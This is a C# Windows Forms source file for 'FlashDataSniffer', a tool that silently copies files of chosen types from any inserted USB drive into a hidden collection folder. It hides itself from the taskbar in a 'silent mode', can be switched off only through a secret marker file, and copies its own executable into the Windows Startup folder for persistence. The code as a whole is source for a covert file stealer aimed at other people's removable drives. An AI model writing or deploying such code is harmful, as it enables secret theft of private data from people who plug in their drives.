using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Security.AccessControl;
using System.Xml;
using System.Runtime.InteropServices;

namespace FlashDataSniffer
{
  public partial class Form1 : Form
  {
    // DATA MEMBERS:
    #region
    Sniffer sniffer = null;
    ComputerDrives PC_Drives = new ComputerDrives();
    string BlackBoxLocation = "";
    List<string> SniffingFormats = new List<string>();
    ProgramSettings settings = new ProgramSettings();
    string settingsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SniffingFreak\\Settings.xml";
    XmlDocument xDoc = new XmlDocument();
    string xDoc_Path = "";
    string StartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    string exeDir = Application.ExecutablePath;
    string exeFileName = "";
    #endregion

    // CONSTRUCTOR:
    #region
    public Form1()
    {
      InitializeComponent();

      if (!SettingsFileExist())
        CreateSettingsFile();

      // this is the timer that will detected any newly inserted removable drive and 
      // add it to the removableDrives combobox items.
      timer2.Start();

      // the path to the xml database file
      xDoc_Path = settingsFilePath;

      // getting the name of the application's exe file
      string exePath = Application.ExecutablePath;
      exeFileName = exePath.Substring(exePath.LastIndexOf('\\')+1);
      
      // this loads the blackbox location, sniffing formats, the settings, etc.
      LoadStuffFromDatabase();

      // this gets whatever formats that are in the sniffingFormats textbox to our sniffingFormats list.
      AddFormatsFromTextBoxToList();
      
      // after loading our setting from the database, we'll load them to the settings tab
      // (if (ShowOnStartUp == true) we'll check that box in the settings Tab, etc.
      LoadSettingsTab();
      
      // this just applies the settings in the settings tab
      // so if show on startup is checked, make the app show on startup, etc.
      ApplySettings();

      SilentMode_Button.Enabled = (IsEverythingReady()) ? true:false;
      SniffDrive_Button.Enabled = false;
      ApplyFormats_Button.Enabled = false;
    }

    
    #endregion

    // CLICKS:
    #region
    // in silent mode, the program window gets hidden (BUT NOT FROM TASK MANAGER)
    // the timer starts, in each tick, it checks for newly inserted removable drives
    // if there were any, then sniff them.
    private void SilentMode_Button_Click(object sender, EventArgs e)
    {
      if (settings.SCIRD_Mode == true)
      {
        SniffRemovableDrives(PC_Drives.GetCurrentDrives(DriveType.Removable));
      }
      SilentMode(true);
    }

    // this is just to browse for the black box location.
    private void Browse_Button_Click(object sender, EventArgs e)
    {
      FolderBrowserDialog fbd = new FolderBrowserDialog();
      if (fbd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
      {
        BlackBoxLocation = fbd.SelectedPath;
        BlackBoxLocation_TextBox.Text = BlackBoxLocation;
        if (IsEverythingReady())
        {
          SilentMode_Button.Enabled = true;
          if (RemovableDrives_ComboBox.SelectedIndex != -1)
            SniffDrive_Button.Enabled = true;
        }
      }
    }
        
    // this is the manual sniff button, the user selects a removable drive from the
    // RemovableDrives_ComboBox.
    // NOTE: this button will remain disabled till there is:
    // 1- an existant black box.
    // 2- there's at least one format in the SniffingFormats list.
    private void SniffDrive_Button_Click(object sender, EventArgs e)
    {
      DriveInfo SelectedDrive = new DriveInfo(RemovableDrives_ComboBox.SelectedItem.ToString());
      if (!SelectedDrive.IsReady)
      {
        MessageBox.Show("The Drive you selected is not ready.\r\nMake sure that it's a valid removable drive and it's ready for writing/reading operations.", "Drive Not Ready");
        return;
      }
      sniffer = new Sniffer(SelectedDrive, BlackBoxLocation, SniffingFormats);
      sniffer.StartSniffing();
    }
    
    private void ApplyFormats_Button_Click(object sender, EventArgs e)
    {
      AddFormatsFromTextBoxToList();

      bool _OK = IsEverythingReady();
      SilentMode_Button.Enabled = _OK;
      if (RemovableDrives_ComboBox.SelectedIndex != -1)
        SniffDrive_Button.Enabled = _OK;

      ApplyFormats_Button.Enabled = false;
    }
    #endregion

    // EVENTS:
    #region

    // This is the timer for our silent mode
    // in each tick, it checks for newly inserted removable drives
    // if there were any, then sniff them.
    private void SilentModeTimer_Tick(object sender, EventArgs e)
    {
      if (PC_Drives.HasInsertedNewRemovableDrive() || PC_Drives.HasRemovedRemovableDrive())
      {
        // if the user has inserted a drive, sniff it ^__^
        if (PC_Drives.HasInsertedNewRemovableDrive())
        {
          SniffRemovableDrives(PC_Drives.GetNewlyInsertedRemovableDrives());
        }

        // updating regardless of whether the user inserted or removed.
        // CAREFUL: the position of this update is very sensitive, make sure you put it in the right place.
        PC_Drives.UpdateRemovableDrives();
      }
      if (HasFound_TurnOFF_File())
        SilentMode(false);
    }

    // this method sniffs its parameter drives.
    private void SniffRemovableDrives(List<DriveInfo> RemovableDrives)
    {
      foreach (DriveInfo insertedDrive in RemovableDrives)
      {
        if (insertedDrive.IsReady)
        {
          sniffer = new Sniffer(insertedDrive, BlackBoxLocation, SniffingFormats);
          sniffer.StartSniffing();
        }
      }
    }

    // This is the removable drives detection timer.
    // A scan for all the available drives is performed in each tick.
    private void timer2_Tick(object sender, EventArgs e)
    {
      DetectRemovableDrives();
      if (sniffer != null)
        if (sniffer.Copier.CopyThread.IsAlive) // if copying's in progress, disable those buttons.
        {
          SilentMode_Button.Enabled = false;
          SniffDrive_Button.Enabled = false;
        }
        else
        {
          SilentMode_Button.Enabled = true;
          SniffDrive_Button.Enabled = true;
        }
    }

    // This is just to enable the SniffDrive_Button if the user has everything ready
    // and when he selects a drive from the RemovableDrives_ComboBox.
    private void RemovableDrives_ComboBox_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (IsEverythingReady())
        SniffDrive_Button.Enabled = true;
    }

    // When closing the form, save our stuff to the database.
    // by stuff I mean the black box location and the personal settings.
    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      SaveStuffToDatabase();
    }

    // this is just to enable the applyFormats button when there's something in the sniffing formats textbox.
    private void Formats_TextBox_TextChanged(object sender, EventArgs e)
    {
      ApplyFormats_Button.Enabled = true;
    }

    private void Settings_CheckList_ItemCheck(object sender, ItemCheckEventArgs e)
    {
      if (e.Index == 0) // index of the 1st check box, which is the 'Show On Startup'
      {
        settings.ShowOnStartup = (e.NewValue == CheckState.Checked) ? true : false;
        bool newValue = settings.ShowOnStartup;
      }
      else if (e.Index == 1) // index of the 2nd check box, which is the 'Sniff Current Removalbe Drives In SilentMode' (SCIRD Mode)
      {
        settings.SCIRD_Mode = (e.NewValue == CheckState.Checked) ? true : false;
        bool newValue = settings.SCIRD_Mode;
      }
    }
    #endregion

    // METHODS:
    #region

    // this method indicates whether or not the user has:
    // 1- selected a black box location.
    // 2- added at least one sniffing format.
    private bool IsEverythingReady()
    {
      return (Directory.Exists(BlackBoxLocation) && SniffingFormats.Count >= 1);
    }

    // this method detects the inserted/removed removable drives,
    // then it adds/removes the names of those drives drives comboBox items. 
    private void DetectRemovableDrives()
    {
      List<DriveInfo> RemovableDrives = PC_Drives.GetCurrentDrives(DriveType.Removable);
      if (PC_Drives.HasRemovedRemovableDrive() || PC_Drives.HasInsertedNewRemovableDrive())
      {
        if (PC_Drives.HasRemovedRemovableDrive())
          RemovableDrives = PC_Drives.GetNewlyInsertedRemovableDrives();
        RemovableDrives_ComboBox.Items.Clear();
        PC_Drives.UpdateRemovableDrives();
      }
      for (int i = 0; i < RemovableDrives.Count; i++)
        if(!RemovableDrives_ComboBox.Items.Contains(RemovableDrives[i].Name))
          RemovableDrives_ComboBox.Items.Add(RemovableDrives[i].Name);
    }

    // This enables/disables silent mode depending on the enable parameter.
    private void SilentMode(bool enable)
    {
      WindowState = (enable) ? FormWindowState.Minimized : FormWindowState.Normal;
      ShowInTaskbar = (enable) ? false : true;
      if (enable)
      {
        Timer_SilentMode.Start();
        timer2.Stop();
      }
      else
      {
        Timer_SilentMode.Stop();
        timer2.Start();
      }
    }

    // This methods returns ture if the file 'SilentMode.OFF' is found in the BlackBoxParentDiriectory
    // other wise false. This file is used to turn off silent mode.
    private bool HasFound_TurnOFF_File()
    {
      string BlackBoxParentDiriectory = Directory.GetParent(BlackBoxLocation).ToString();
      return (File.Exists(BlackBoxParentDiriectory + "\\SilentMode.OFF"));
    }

    // this adds the format(s) that the user enters in the Formats_TextBox to our SniffingFormats list.
    // the user could enter enter multiple formats separated by a space character (' ').
    private void AddFormatsFromTextBoxToList()
    {
      // Clearing it out for the new applied formats.
      // you might think that this is a sign of weakness from me doin this
      // but, if I only add the newly added formats, then I'd have to worry about 
      // the possibility that the user might remove some formats from the textbox
      // then I'd have to find those removed ones and remove them from the list
      // which means more complixity and effort.
      SniffingFormats.Clear();

      // getting the formats that are in the sniffing formats textbox
      string[] Formats = sniffingFormats_TextBox.Text.Split('\n');

      // adding them to the sniffingFormats list, after cleaning them (removing any whitespace characters)
      for(int i = 0; i < Formats.Length; i++)
      {
        Formats[i] = Formats[i].Trim(); // we trimmed cuz we splitted at \n which leaves \r in the end.
        if (!String.IsNullOrEmpty(Formats[i]))
        {
          if (Formats[i][0] != '.') // if it's not in the form of ".format" then make it like that (if it was "jpg" instead of ".jpg")
            Formats[i] = Formats[i].Insert(0, ".");
          SniffingFormats.Add(Formats[i]); 
        }
      }
    }

    private void ApplySettings()
    {
      // ShowOnStartup setting
      #region
      if (settings.ShowOnStartup)
      {
        try
        {
          if (!File.Exists(StartupFolder + "\\" + exeFileName))
          {
            string exeDir = Directory.GetCurrentDirectory();

            // this isn't actually the best way to do this, i mean, if the user creates/copies another exe in the program's dir
            // then this won't actually work well.
            File.Copy(exeDir + "\\" + exeFileName, StartupFolder + "\\" + exeFileName);
          }
        }
        catch (Exception ex) { MessageBox.Show(ex.Message); }
      }
      else
      {
        if (File.Exists(StartupFolder + "\\" + exeFileName))
        {
          File.Delete(StartupFolder + "\\" + exeFileName);
        }
      }
      #endregion
    }
    private void ChangeFolderPermissions(string user, string path, FileSystemRights rights, AccessControlType type)
    {
      DirectoryInfo info = new DirectoryInfo(path);
      DirectorySecurity sec = info.GetAccessControl();
      sec.ResetAccessRule(new FileSystemAccessRule(user, rights, type));
      info.SetAccessControl(sec);
    }
    private void LoadSettingsTab()
    {
      Settings_CheckList.SetItemCheckState(0, (settings.ShowOnStartup) ? CheckState.Checked : CheckState.Unchecked);
      Settings_CheckList.SetItemCheckState(1, (settings.SCIRD_Mode) ? CheckState.Checked : CheckState.Unchecked);
    }
    private void CreateSettingsFile()
    {
      string settingsFileParentDir = Directory.GetParent(settingsFilePath).ToString();
      if (!Directory.Exists(settingsFileParentDir))
        Directory.CreateDirectory(settingsFileParentDir);
      FileStream fs = File.Create(settingsFilePath);
      StreamWriter sw = new StreamWriter(fs);
      sw.WriteLine(Properties.Resources.Settings);
      sw.Close();
      fs.Close();
    }
    private bool SettingsFileExist()
    {
      return (File.Exists(settingsFilePath));
    }
    #endregion

    // DATABASE MANAGEMENT:
    #region
    // Loads the BlackBox Location, sniffing formats and the settings from the db.
    private void LoadStuffFromDatabase()
    {
      xDoc.Load(xDoc_Path);

      // loading the settings:
      settings.ShowOnStartup = Convert.ToBoolean(xDoc.DocumentElement.ChildNodes[0].SelectSingleNode("ShowOnStartup").InnerText);
      settings.SCIRD_Mode = Convert.ToBoolean(xDoc.DocumentElement.ChildNodes[0].SelectSingleNode("SniffCurrentRemovalbeDrivesInSilentMode").InnerText);

      // loading the black box location:
      BlackBoxLocation = xDoc.DocumentElement.ChildNodes[1].InnerText;
      BlackBoxLocation_TextBox.Text = BlackBoxLocation;

      // loading the sniffing formats:
      XmlNode SniffingFormatsNode = xDoc.DocumentElement.ChildNodes[2];

      // in the db, the formats are splitted by a space character
      string[] Formats = SniffingFormatsNode.InnerText.Split(' ');
      foreach(string format in Formats)
      {
        // adding them to our formats list
        SniffingFormats.Add(format);

        // and to the formats text box
        sniffingFormats_TextBox.Text += format + "\r\n";
      }

      // No need to save anything cuz we're just loading.
    }

    // Saves the BlackBox Location, sniffing formats and the settings to the db.
    private void SaveStuffToDatabase()
    {
      xDoc.Load(xDoc_Path);

      // saving the settings:
      xDoc.DocumentElement.ChildNodes[0].SelectSingleNode("ShowOnStartup").InnerText = settings.ShowOnStartup.ToString();
      xDoc.DocumentElement.ChildNodes[0].SelectSingleNode("SniffCurrentRemovalbeDrivesInSilentMode").InnerText = settings.SCIRD_Mode.ToString();

      // saving the location of the black box:
      xDoc.DocumentElement.ChildNodes[1].InnerText = BlackBoxLocation;

      // saving the sniffing formats:
      XmlNode SniffingFormatsNode = xDoc.DocumentElement.ChildNodes[2];

      // clearing the innerText of our node so that we could save the formats in it with a += fashion:
      SniffingFormatsNode.InnerText = "";

      // saving the formats:
      for(int i = 0; i < SniffingFormats.Count; i++)
        SniffingFormatsNode.InnerText += SniffingFormats[i] + ((i == SniffingFormats.Count-1) ? "" : " ");

      xDoc.Save(xDoc_Path);
    }
    #endregion
  }
  public class ProgramSettings { public bool ShowOnStartup = false; public bool SCIRD_Mode = false;}
}